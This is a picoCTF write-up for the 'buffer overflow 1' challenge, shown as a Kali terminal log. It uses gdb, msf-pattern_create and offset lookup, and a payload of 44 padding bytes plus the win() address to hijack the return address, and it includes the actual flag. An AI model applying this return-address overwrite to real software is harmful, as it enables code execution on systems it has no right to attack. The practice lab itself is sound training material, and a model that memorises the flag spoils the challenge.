# Retos picoCTF

# Level buffer overflow 1

## Objetivo
Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source here. And connect with it using nc saturn.picoctf.net 52166

## Solucion

```
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ gdb -q vuln
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
--Type <RET> for more, q to quit, c to continue without paging--c
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
(gdb) dissasemble main
Undefined command: "dissasemble".  Try "help".
(gdb) dissassemble main
Undefined command: "dissassemble".  Try "help".
(gdb) disassemble main
Dump of assembler code for function main:
   0x080492c4 <+0>:     endbr32
   0x080492c8 <+4>:     lea    0x4(%esp),%ecx
   0x080492cc <+8>:     and    $0xfffffff0,%esp
   0x080492cf <+11>:    push   -0x4(%ecx)
   0x080492d2 <+14>:    push   %ebp
   0x080492d3 <+15>:    mov    %esp,%ebp
   0x080492d5 <+17>:    push   %ebx
   0x080492d6 <+18>:    push   %ecx
   0x080492d7 <+19>:    sub    $0x10,%esp
   0x080492da <+22>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492df <+27>:    add    $0x2d21,%ebx
   0x080492e5 <+33>:    mov    -0x4(%ebx),%eax
   0x080492eb <+39>:    mov    (%eax),%eax
   0x080492ed <+41>:    push   $0x0
   0x080492ef <+43>:    push   $0x2
   0x080492f1 <+45>:    push   $0x0
   0x080492f3 <+47>:    push   %eax
   0x080492f4 <+48>:    call   0x80490b0 <setvbuf@plt>
   0x080492f9 <+53>:    add    $0x10,%esp
   0x080492fc <+56>:    call   0x8049070 <getegid@plt>
   0x08049301 <+61>:    mov    %eax,-0xc(%ebp)
   0x08049304 <+64>:    sub    $0x4,%esp
   0x08049307 <+67>:    push   -0xc(%ebp)
--Type <RET> for more, q to quit, c to continue without paging--exit
   0x0804930a <+70>:    push   -0xc(%ebp)
   0x0804930d <+73>:    push   -0xc(%ebp)
   0x08049310 <+76>:    call   0x80490d0 <setresgid@plt>
   0x08049315 <+81>:    add    $0x10,%esp
   0x08049318 <+84>:    sub    $0xc,%esp
   0x0804931b <+87>:    lea    -0x1f60(%ebx),%eax
   0x08049321 <+93>:    push   %eax
   0x08049322 <+94>:    call   0x8049080 <puts@plt>
   0x08049327 <+99>:    add    $0x10,%esp
   0x0804932a <+102>:   call   0x8049281 <vuln>
   0x0804932f <+107>:   mov    $0x0,%eax
   0x08049334 <+112>:   lea    -0x8(%ebp),%esp
   0x08049337 <+115>:   pop    %ecx
   0x08049338 <+116>:   pop    %ebx
   0x08049339 <+117>:   pop    %ebp
   0x0804933a <+118>:   lea    -0x4(%ecx),%esp
   0x0804933d <+121>:   ret
End of assembler dump.
(gdb) exit
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ msf-pattern_create -l 200  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ echo Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag | ./vuln 

Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x35624134
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ msf-pattern_offset -q 0x35624134  
[*] Exact match at offset 44
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ python3 -c 'print("A"*44+"BBBB")' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x42424242
zsh: done                python3 -c 'print("A"*44+"BBBB")' | 
zsh: segmentation fault  ./vuln
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ readelf -s vuln | grep "win" 
    63: 080491f6   139 FUNC    GLOBAL DEFAULT   13 win
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ vim solve.py
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ python solve.py          
[+] Starting local process '/home/kali/Downloads/bufferOverflow1/vuln': pid 69533
[+] Starting local process '/home/kali/Downloads/bufferOverflow1/vuln': pid 69535
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{dummie_flag}
[*] Got EOF while reading in interactive
$ 
[*] Process '/home/kali/Downloads/bufferOverflow1/vuln' stopped with exit code -11 (SIGSEGV) (pid 69535)
[*] Got EOF while sending in interactive
[*] Stopped process '/home/kali/Downloads/bufferOverflow1/vuln' (pid 69533)
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ ls
core.69535  flag.txt  solve.py  vuln  vuln.c
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ cat flag.txt       
picoCTF{dummie_flag}
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ vim solve2.py
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ python solve2.py
Traceback (most recent call last):
  File "/home/kali/Downloads/bufferOverflow1/solve2.py", line 7, in <module>
    host, port = 'saturn.picoctf.net', [PORT]
                                        ^^^^
NameError: name 'PORT' is not defined
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ vim solve2.py   
                                                                                   
┌──(kali㉿kali)-[~/Downloads/bufferOverflow1]
└─$ python solve2.py
[+] Starting local process '/home/kali/Downloads/bufferOverflow1/vuln': pid 70887
[+] Opening connection to saturn.picoctf.net on port 50732: Done
[*] Switching to interactive mode
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}[*] Got EOF while reading in interactive
$ 

```

## Referencias


